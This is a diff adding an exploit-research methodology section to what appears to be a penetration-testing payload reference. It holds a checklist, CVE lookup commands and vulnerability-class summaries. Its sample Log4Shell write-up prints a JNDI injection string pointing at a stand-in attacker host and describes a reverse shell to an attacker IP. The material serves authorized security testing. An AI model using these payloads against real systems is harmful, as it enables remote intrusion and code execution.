@@ -2,6 +2,147 @@
 
 This reference document contains common attack patterns, payloads, and exploitation techniques for penetration testing.
 
+## Exploit Research Methodology
+
+> ⚠️ **MANDATORY**: Before deploying ANY exploit, you MUST complete thorough research to understand how it works. Never use an exploit as a "black box".
+
+### Research Checklist
+
+For every exploit, answer these questions BEFORE execution:
+
+1. **What vulnerability does this exploit target?**
+   - CVE identifier (if assigned)
+   - Vulnerability class (RCE, LFI, SQLi, Buffer Overflow, etc.)
+   - Affected software versions
+
+2. **How does the exploit work technically?**
+   - What is the root cause of the vulnerability?
+   - What input triggers the vulnerable code path?
+   - How does the exploit achieve code execution or data access?
+   - What memory corruption or logic flaw is being abused?
+
+3. **What are the prerequisites for success?**
+   - Required target configuration
+   - Network accessibility requirements
+   - Authentication requirements
+   - Timing or race conditions
+
+4. **What does the payload do?**
+   - Exact commands or shellcode being executed
+   - Callback/reverse shell details
+   - Files created or modified
+   - Persistence mechanisms (if any)
+
+5. **What are the risks and artifacts?**
+   - Will the exploit crash the target service?
+   - What logs or artifacts are created?
+   - Is the exploit reliable or probabilistic?
+   - Can it be detected by security tools?
+
+### Research Resources
+
+**Primary Sources** (Always check these first):
+```bash
+# Read exploit source code - MOST IMPORTANT
+searchsploit -x [EXPLOIT_ID]
+cat exploit.py | head -100  # Read comments and documentation
+
+# Official CVE details
+curl -s "https://cveawg.mitre.org/api/cve/CVE-XXXX-XXXX" | jq .
+
+# NVD for CVSS and technical details
+curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-XXXX-XXXX" | jq .
+```
+
+**Secondary Sources**:
+- Exploit-DB writeups: `searchsploit -w [EXPLOIT_ID]`
+- Vendor security advisories
+- Security researcher blogs/writeups
+- GitHub issues and commits that patched the vulnerability
+
+### Understanding Common Vulnerability Classes
+
+**Buffer Overflow**:
+- Occurs when input exceeds buffer boundaries
+- May overwrite return addresses, function pointers, or SEH handlers
+- Exploits often include NOP sleds and shellcode positioning
+- Modern mitigations: ASLR, DEP/NX, Stack Canaries
+
+**Remote Code Execution (RCE)**:
+- Allows arbitrary command/code execution on target
+- May leverage deserialization, template injection, or command injection
+- Understand the execution context (user privileges)
+
+**SQL Injection**:
+- Unsanitized input in SQL queries
+- Types: Union-based, Boolean-blind, Time-blind, Error-based
+- Understand database type and privileges
+
+**Deserialization**:
+- Untrusted data deserialized without validation
+- Gadget chains achieve code execution
+- Payload depends on available classes in classpath
+
+**Path Traversal / LFI**:
+- Directory traversal to access unauthorized files
+- May escalate to RCE via log poisoning, wrapper protocols
+- Understand null byte injection and encoding bypasses
+
+### Exploit Modification Guidelines
+
+When adapting exploits for your target:
+
+1. **Identify configurable parameters**:
+   - Target IP/hostname and port
+   - Callback/listener IP and port
+   - Payload type (reverse shell, bind shell, command execution)
+   - Offsets (for buffer overflows)
+
+2. **Verify compatibility**:
+   - Check target OS and architecture (x86 vs x64)
+   - Verify exact software version
+   - Check for any applied patches
+
+3. **Test safely first**:
+   - Use benign payloads (like `id` or `whoami`) before reverse shells
+   - Test in isolated environment if possible
+   - Have rollback plan for service crashes
+
+### Example Research Documentation
+
+Document your research in `pentest_log.md`:
+
+```markdown
+## Exploit Research: CVE-2021-44228 (Log4Shell)
+
+**Vulnerability Class**: Remote Code Execution via JNDI Injection
+**Affected**: Apache Log4j 2.0-beta9 through 2.14.1
+**CVSS**: 10.0 (Critical)
+
+**Technical Details**:
+- Log4j processes JNDI lookup strings in log messages
+- Attacker injects `${jndi:ldap://attacker/exploit}` in any logged field
+- Log4j fetches and executes remote Java class
+- No authentication required, exploitable via User-Agent, form fields, etc.
+
+**Exploitation Steps**:
+1. Set up LDAP server serving malicious Java class
+2. Inject JNDI string in logged parameter
+3. Target fetches and executes payload
+
+**Payload Understanding**:
+- Using marshalsec LDAP server
+- Payload executes reverse shell to [ATTACKER_IP]:4444
+- Runs as the user running the Java application
+
+**Risks**:
+- May trigger WAF/IDS alerts on JNDI patterns
+- Creates entries in application logs
+- Reliable exploitation, low crash risk
+```
+
+---
+
 ## Web Application Attacks
 
 ### SQL Injection Payloads
